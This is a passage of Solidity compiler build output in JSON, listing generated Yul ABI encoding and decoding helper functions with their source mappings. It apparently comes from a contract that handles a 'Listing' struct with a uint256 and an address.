t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":5256,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619_to_t_string_memory_ptr_fromStack":{"entryPoint":5291,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_t_struct$_Listing_$2632_memory_ptr_to_t_struct$_Listing_$2632_memory_ptr_fromStack":{"entryPoint":5326,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_uint256_to_t_uint256":{"entryPoint":5373,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_t_uint256_to_t_uint256_fromStack":{"entryPoint":5388,"id":null,"parameterSlots":2,"returnSlots":0},"abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed":{"entryPoint":5403,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_address_t_address_t_uint256__to_t_address_t_address_t_uint256__fromStack_reversed":{"entryPoint":5424,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed":{"entryPoint":5479,"id":null,"parameterSlots":3,"returnSlots":1},"abi_encode_tuple_t_address_t_uint256_t_uint256__to_t_address_t_uint256_t_uint256__fromStack_reversed":{"entryPoint":5520,"id":null,"parameterSlots":4,"returnSlots":1},"abi_encode_tuple_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":5575,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619__to_t_string_memory_ptr__fromStack_reversed":{"entryPoint":5607,"id":null,"parameterSlots":1,"returnSlots":1},"abi_encode_tuple_t_struct$_Listing_$2632_memory_ptr__to_t_struct$_Listing_$2632_memory_ptr__fromStack_reversed":{"entryPoint":5639,"id":null,"parameterSlots":2,"returnSlots":1},"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed":{"entryPoint":5666,"id":null,"parameterSlots":2,"returnSlots":1},"allocate_unbounded":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":1},"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack":{"entryPoint":5693,"id":null,"parameterSlots":2,"returnSlots":1},"array_storeLengthForEncoding_t_string_memory_ptr_fromStack":{"entryPoint":5704,"id":null,"parameterSlots":2,"returnSlots":1},"checked_add_t_uint256":{"entryPoint":5721,"id":null,"parameterSlots":2,"returnSlots":1},"cleanup_t_address":{"entryPoint":5807,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint160":{"entryPoint":5825,"id":null,"parameterSlots":1,"returnSlots":1},"cleanup_t_uint256":{"entryPoint":5857,"id":null,"parameterSlots":1,"returnSlots":1},"panic_error_0x11":{"entryPoint":5867,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db":{"entryPoint":null,"id":null,"parameterSlots":0,"returnSlots":0},"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b":{"entryPoint":5914,"id":null,"parameterSlots":0,"returnSlots":0},"store_literal_in_memory_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51":{"entryPoint":5919,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470":{"entryPoint":5960,"id":null,"parameterSlots":1,"returnSlots":0},"store_literal_in_memory_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619":{"entryPoint":5963,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_address":{"entryPoint":6004,"id":null,"parameterSlots":1,"returnSlots":0},"validator_revert_t_uint256":{"entryPoint":6027,"id":null,"parameterSlots":1,"returnSlots":0}},"generatedSources":[{"ast":{"nodeType":"YulBlock","src":"0:9678:15","statements":[{"body":{"nodeType":"YulBlock","src":"59:87:15","statements":[{"nodeType":"YulAssignment","src":"69:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"91:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"78:12:15"},"nodeType":"YulFunctionCall","src":"78:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"69:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"134:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"107:26:15"},"nodeType":"YulFunctionCall","src":"107:33:15"},"nodeType":"YulExpressionStatement","src":"107:33:15"}]},"name":"abi_decode_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"37:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"45:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"53:5:15","type":""}],"src":"7:139:15"},{"body":{"nodeType":"YulBlock","src":"215:80:15","statements":[{"nodeType":"YulAssignment","src":"225:22:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"240:6:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"234:5:15"},"nodeType":"YulFunctionCall","src":"234:13:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"225:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"283:5:15"}],"functionName":{"name":"validator_revert_t_address","nodeType":"YulIdentifier","src":"256:26:15"},"nodeType":"YulFunctionCall","src":"256:33:15"},"nodeType":"YulExpressionStatement","src":"256:33:15"}]},"name":"abi_decode_t_address_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"193:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"201:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"209:5:15","type":""}],"src":"152:143:15"},{"body":{"nodeType":"YulBlock","src":"353:87:15","statements":[{"nodeType":"YulAssignment","src":"363:29:15","value":{"arguments":[{"name":"offset","nodeType":"YulIdentifier","src":"385:6:15"}],"functionName":{"name":"calldataload","nodeType":"YulIdentifier","src":"372:12:15"},"nodeType":"YulFunctionCall","src":"372:20:15"},"variableNames":[{"name":"value","nodeType":"YulIdentifier","src":"363:5:15"}]},{"expression":{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"428:5:15"}],"functionName":{"name":"validator_revert_t_uint256","nodeType":"YulIdentifier","src":"401:26:15"},"nodeType":"YulFunctionCall","src":"401:33:15"},"nodeType":"YulExpressionStatement","src":"401:33:15"}]},"name":"abi_decode_t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nodeType":"YulTypedName","src":"331:6:15","type":""},{"name":"end","nodeType":"YulTypedName","src":"339:3:15","type":""}],"returnVariables":[{"name":"value","nodeType":"YulTypedName","src":"347:5:15","type":""}],"src":"301:139:15"},{"body":{"nodeType":"YulBlock","src":"512:263:15","statements":[{"body":{"nodeType":"YulBlock","src":"558:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"560:77:15"},"nodeType":"YulFunctionCall","src":"560:79:15"},"nodeType":"YulExpressionStatement","src":"560:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"533:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"542:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"529:3:15"},"nodeType":"YulFunctionCall","src":"529:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"554:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"525:3:15"},"nodeType":"YulFunctionCall","src":"525:32:15"},"nodeType":"YulIf","src":"522:119:15"},{"nodeType":"YulBlock","src":"651:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"666:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"680:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"670:6:15","type":""}]},{"nodeType":"YulAssignment","src":"695:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"730:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"741:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"726:3:15"},"nodeType":"YulFunctionCall","src":"726:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"750:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"705:20:15"},"nodeType":"YulFunctionCall","src":"705:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"695:6:15"}]}]}]},"name":"abi_decode_tuple_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"482:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"493:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"505:6:15","type":""}],"src":"446:329:15"},{"body":{"nodeType":"YulBlock","src":"858:274:15","statements":[{"body":{"nodeType":"YulBlock","src":"904:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"906:77:15"},"nodeType":"YulFunctionCall","src":"906:79:15"},"nodeType":"YulExpressionStatement","src":"906:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"879:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"888:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"875:3:15"},"nodeType":"YulFunctionCall","src":"875:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"900:2:15","type":"","value":"32"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"871:3:15"},"nodeType":"YulFunctionCall","src":"871:32:15"},"nodeType":"YulIf","src":"868:119:15"},{"nodeType":"YulBlock","src":"997:128:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1012:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1026:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1016:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1041:74:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1087:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1098:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1083:3:15"},"nodeType":"YulFunctionCall","src":"1083:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1107:7:15"}],"functionName":{"name":"abi_decode_t_address_fromMemory","nodeType":"YulIdentifier","src":"1051:31:15"},"nodeType":"YulFunctionCall","src":"1051:64:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1041:6:15"}]}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"828:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"839:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"851:6:15","type":""}],"src":"781:351:15"},{"body":{"nodeType":"YulBlock","src":"1221:391:15","statements":[{"body":{"nodeType":"YulBlock","src":"1267:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1269:77:15"},"nodeType":"YulFunctionCall","src":"1269:79:15"},"nodeType":"YulExpressionStatement","src":"1269:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1242:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1251:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1238:3:15"},"nodeType":"YulFunctionCall","src":"1238:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1263:2:15","type":"","value":"64"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1234:3:15"},"nodeType":"YulFunctionCall","src":"1234:32:15"},"nodeType":"YulIf","src":"1231:119:15"},{"nodeType":"YulBlock","src":"1360:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1375:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1389:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1379:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1404:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1439:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1450:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1435:3:15"},"nodeType":"YulFunctionCall","src":"1435:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1459:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"1414:20:15"},"nodeType":"YulFunctionCall","src":"1414:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1404:6:15"}]}]},{"nodeType":"YulBlock","src":"1487:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1502:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1516:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1506:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1532:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1567:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1578:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1563:3:15"},"nodeType":"YulFunctionCall","src":"1563:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1587:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"1542:20:15"},"nodeType":"YulFunctionCall","src":"1542:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"1532:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1183:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1194:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1206:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"1214:6:15","type":""}],"src":"1138:474:15"},{"body":{"nodeType":"YulBlock","src":"1718:519:15","statements":[{"body":{"nodeType":"YulBlock","src":"1764:83:15","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nodeType":"YulIdentifier","src":"1766:77:15"},"nodeType":"YulFunctionCall","src":"1766:79:15"},"nodeType":"YulExpressionStatement","src":"1766:79:15"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nodeType":"YulIdentifier","src":"1739:7:15"},{"name":"headStart","nodeType":"YulIdentifier","src":"1748:9:15"}],"functionName":{"name":"sub","nodeType":"YulIdentifier","src":"1735:3:15"},"nodeType":"YulFunctionCall","src":"1735:23:15"},{"kind":"number","nodeType":"YulLiteral","src":"1760:2:15","type":"","value":"96"}],"functionName":{"name":"slt","nodeType":"YulIdentifier","src":"1731:3:15"},"nodeType":"YulFunctionCall","src":"1731:32:15"},"nodeType":"YulIf","src":"1728:119:15"},{"nodeType":"YulBlock","src":"1857:117:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1872:15:15","value":{"kind":"number","nodeType":"YulLiteral","src":"1886:1:15","type":"","value":"0"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"1876:6:15","type":""}]},{"nodeType":"YulAssignment","src":"1901:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"1936:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"1947:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"1932:3:15"},"nodeType":"YulFunctionCall","src":"1932:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"1956:7:15"}],"functionName":{"name":"abi_decode_t_address","nodeType":"YulIdentifier","src":"1911:20:15"},"nodeType":"YulFunctionCall","src":"1911:53:15"},"variableNames":[{"name":"value0","nodeType":"YulIdentifier","src":"1901:6:15"}]}]},{"nodeType":"YulBlock","src":"1984:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"1999:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2013:2:15","type":"","value":"32"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2003:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2029:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2064:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2075:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2060:3:15"},"nodeType":"YulFunctionCall","src":"2060:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2084:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"2039:20:15"},"nodeType":"YulFunctionCall","src":"2039:53:15"},"variableNames":[{"name":"value1","nodeType":"YulIdentifier","src":"2029:6:15"}]}]},{"nodeType":"YulBlock","src":"2112:118:15","statements":[{"nodeType":"YulVariableDeclaration","src":"2127:16:15","value":{"kind":"number","nodeType":"YulLiteral","src":"2141:2:15","type":"","value":"64"},"variables":[{"name":"offset","nodeType":"YulTypedName","src":"2131:6:15","type":""}]},{"nodeType":"YulAssignment","src":"2157:63:15","value":{"arguments":[{"arguments":[{"name":"headStart","nodeType":"YulIdentifier","src":"2192:9:15"},{"name":"offset","nodeType":"YulIdentifier","src":"2203:6:15"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2188:3:15"},"nodeType":"YulFunctionCall","src":"2188:22:15"},{"name":"dataEnd","nodeType":"YulIdentifier","src":"2212:7:15"}],"functionName":{"name":"abi_decode_t_uint256","nodeType":"YulIdentifier","src":"2167:20:15"},"nodeType":"YulFunctionCall","src":"2167:53:15"},"variableNames":[{"name":"value2","nodeType":"YulIdentifier","src":"2157:6:15"}]}]}]},"name":"abi_decode_tuple_t_addresst_uint256t_uint256","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nodeType":"YulTypedName","src":"1672:9:15","type":""},{"name":"dataEnd","nodeType":"YulTypedName","src":"1683:7:15","type":""}],"returnVariables":[{"name":"value0","nodeType":"YulTypedName","src":"1695:6:15","type":""},{"name":"value1","nodeType":"YulTypedName","src":"1703:6:15","type":""},{"name":"value2","nodeType":"YulTypedName","src":"1711:6:15","type":""}],"src":"1618:619:15"},{"body":{"nodeType":"YulBlock","src":"2298:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2315:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"2338:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"2320:17:15"},"nodeType":"YulFunctionCall","src":"2320:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2308:6:15"},"nodeType":"YulFunctionCall","src":"2308:37:15"},"nodeType":"YulExpressionStatement","src":"2308:37:15"}]},"name":"abi_encode_t_address_to_t_address","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"2286:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"2293:3:15","type":""}],"src":"2243:108:15"},{"body":{"nodeType":"YulBlock","src":"2422:53:15","statements":[{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2439:3:15"},{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"2462:5:15"}],"functionName":{"name":"cleanup_t_address","nodeType":"YulIdentifier","src":"2444:17:15"},"nodeType":"YulFunctionCall","src":"2444:24:15"}],"functionName":{"name":"mstore","nodeType":"YulIdentifier","src":"2432:6:15"},"nodeType":"YulFunctionCall","src":"2432:37:15"},"nodeType":"YulExpressionStatement","src":"2432:37:15"}]},"name":"abi_encode_t_address_to_t_address_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"2410:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"2417:3:15","type":""}],"src":"2357:118:15"},{"body":{"nodeType":"YulBlock","src":"2627:220:15","statements":[{"nodeType":"YulAssignment","src":"2637:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2703:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"2708:2:15","type":"","value":"15"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"2644:58:15"},"nodeType":"YulFunctionCall","src":"2644:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"2637:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2809:3:15"}],"functionName":{"name":"store_literal_in_memory_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51","nodeType":"YulIdentifier","src":"2720:88:15"},"nodeType":"YulFunctionCall","src":"2720:93:15"},"nodeType":"YulExpressionStatement","src":"2720:93:15"},{"nodeType":"YulAssignment","src":"2822:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"2833:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"2838:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"2829:3:15"},"nodeType":"YulFunctionCall","src":"2829:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"2822:3:15"}]}]},"name":"abi_encode_t_stringliteral_25adaa6d082ce15f901e0d8a3d393e7462ef9edf2e6bc8321fa14d1615b6fc51_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"2615:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"2623:3:15","type":""}],"src":"2481:366:15"},{"body":{"nodeType":"YulBlock","src":"3016:235:15","statements":[{"nodeType":"YulAssignment","src":"3026:90:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3109:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"3114:1:15","type":"","value":"0"}],"functionName":{"name":"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulIdentifier","src":"3033:75:15"},"nodeType":"YulFunctionCall","src":"3033:83:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"3026:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3214:3:15"}],"functionName":{"name":"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470","nodeType":"YulIdentifier","src":"3125:88:15"},"nodeType":"YulFunctionCall","src":"3125:93:15"},"nodeType":"YulExpressionStatement","src":"3125:93:15"},{"nodeType":"YulAssignment","src":"3227:18:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3238:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"3243:1:15","type":"","value":"0"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3234:3:15"},"nodeType":"YulFunctionCall","src":"3234:11:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"3227:3:15"}]}]},"name":"abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"3004:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"3012:3:15","type":""}],"src":"2853:398:15"},{"body":{"nodeType":"YulBlock","src":"3403:220:15","statements":[{"nodeType":"YulAssignment","src":"3413:74:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3479:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"3484:2:15","type":"","value":"31"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nodeType":"YulIdentifier","src":"3420:58:15"},"nodeType":"YulFunctionCall","src":"3420:67:15"},"variableNames":[{"name":"pos","nodeType":"YulIdentifier","src":"3413:3:15"}]},{"expression":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3585:3:15"}],"functionName":{"name":"store_literal_in_memory_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619","nodeType":"YulIdentifier","src":"3496:88:15"},"nodeType":"YulFunctionCall","src":"3496:93:15"},"nodeType":"YulExpressionStatement","src":"3496:93:15"},{"nodeType":"YulAssignment","src":"3598:19:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3609:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"3614:2:15","type":"","value":"32"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3605:3:15"},"nodeType":"YulFunctionCall","src":"3605:12:15"},"variableNames":[{"name":"end","nodeType":"YulIdentifier","src":"3598:3:15"}]}]},"name":"abi_encode_t_stringliteral_ebf73bba305590e4764d5cb53b69bffd6d4d092d1a67551cb346f8cfcdab8619_to_t_string_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nodeType":"YulTypedName","src":"3391:3:15","type":""}],"returnVariables":[{"name":"end","nodeType":"YulTypedName","src":"3399:3:15","type":""}],"src":"3257:366:15"},{"body":{"nodeType":"YulBlock","src":"3815:394:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3825:26:15","value":{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"3841:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"3846:4:15","type":"","value":"0x40"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3837:3:15"},"nodeType":"YulFunctionCall","src":"3837:14:15"},"variables":[{"name":"tail","nodeType":"YulTypedName","src":"3829:4:15","type":""}]},{"nodeType":"YulBlock","src":"3861:165:15","statements":[{"nodeType":"YulVariableDeclaration","src":"3897:43:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"3927:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"3934:4:15","type":"","value":"0x00"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"3923:3:15"},"nodeType":"YulFunctionCall","src":"3923:16:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"3917:5:15"},"nodeType":"YulFunctionCall","src":"3917:23:15"},"variables":[{"name":"memberValue0","nodeType":"YulTypedName","src":"3901:12:15","type":""}]},{"expression":{"arguments":[{"name":"memberValue0","nodeType":"YulIdentifier","src":"3987:12:15"},{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"4005:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"4010:4:15","type":"","value":"0x00"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4001:3:15"},"nodeType":"YulFunctionCall","src":"4001:14:15"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256","nodeType":"YulIdentifier","src":"3953:33:15"},"nodeType":"YulFunctionCall","src":"3953:63:15"},"nodeType":"YulExpressionStatement","src":"3953:63:15"}]},{"nodeType":"YulBlock","src":"4036:166:15","statements":[{"nodeType":"YulVariableDeclaration","src":"4073:43:15","value":{"arguments":[{"arguments":[{"name":"value","nodeType":"YulIdentifier","src":"4103:5:15"},{"kind":"number","nodeType":"YulLiteral","src":"4110:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4099:3:15"},"nodeType":"YulFunctionCall","src":"4099:16:15"}],"functionName":{"name":"mload","nodeType":"YulIdentifier","src":"4093:5:15"},"nodeType":"YulFunctionCall","src":"4093:23:15"},"variables":[{"name":"memberValue0","nodeType":"YulTypedName","src":"4077:12:15","type":""}]},{"expression":{"arguments":[{"name":"memberValue0","nodeType":"YulIdentifier","src":"4163:12:15"},{"arguments":[{"name":"pos","nodeType":"YulIdentifier","src":"4181:3:15"},{"kind":"number","nodeType":"YulLiteral","src":"4186:4:15","type":"","value":"0x20"}],"functionName":{"name":"add","nodeType":"YulIdentifier","src":"4177:3:15"},"nodeType":"YulFunctionCall","src":"4177:14:15"}],"functionName":{"name":"abi_encode_t_address_to_t_address","nodeType":"YulIdentifier","src":"4129:33:15"},"nodeType":"YulFunctionCall","src":"4129:63:15"},"nodeType":"YulExpressionStatement","src":"4129:63:15"}]}]},"name":"abi_encode_t_struct$_Listing_$2632_memory_ptr_to_t_struct$_Listing_$2632_memory_ptr_fromStack","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nodeType":"YulTypedName","src":"3802:5:15","type":""},{"name":"pos","nodeType":"YulTypedName","src":"3809:3:15","type":""}],"src":"3699:510:15"},{"body":{"nodeType":"YulBlock","src":"4270:53:15","statements":[{"expression":{"arguments":[{"name":"